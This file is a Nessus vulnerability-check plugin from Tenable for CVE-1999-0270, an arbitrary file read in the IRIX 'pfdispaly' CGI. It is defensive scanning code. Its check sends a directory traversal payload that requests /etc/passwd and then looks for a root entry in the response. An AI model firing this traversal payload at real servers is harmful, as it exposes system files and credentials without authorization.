#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10174);
 script_version ("$Revision: 1.29 $");
 script_cvs_date("$Date: 2013/01/25 01:19:09 $");
 script_cve_id("CVE-1999-0270");
 script_osvdb_id(134);

 script_name(english:"IRIX pfdispaly Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"It may be possible to read arbitrary files from the remote
system." );

 script_set_attribute(attribute:"description", value:
"The 'pfdispaly' CGI is installed. This CGI has a well known 
security flaw that lets an attacker read arbitrary files 
with the privileges of the http daemon (usually root or nobody)." );

 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");

 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1998/04/02");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english: "Checks for the presence of /cgi-bin/pfdispaly");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 1999-2013 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 foreach cgi (make_list("pfdispaly", "pfdispaly.cgi"))
 {
   r = http_send_recv3(method: 'GET', item: strcat(dir, "/", cgi, "?../../../../../../etc/passwd"), port:port);
  if (isnull(r)) exit(0);
  if (egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))
  {
    security_hole(port);
    exit(0);
  }
 }
}
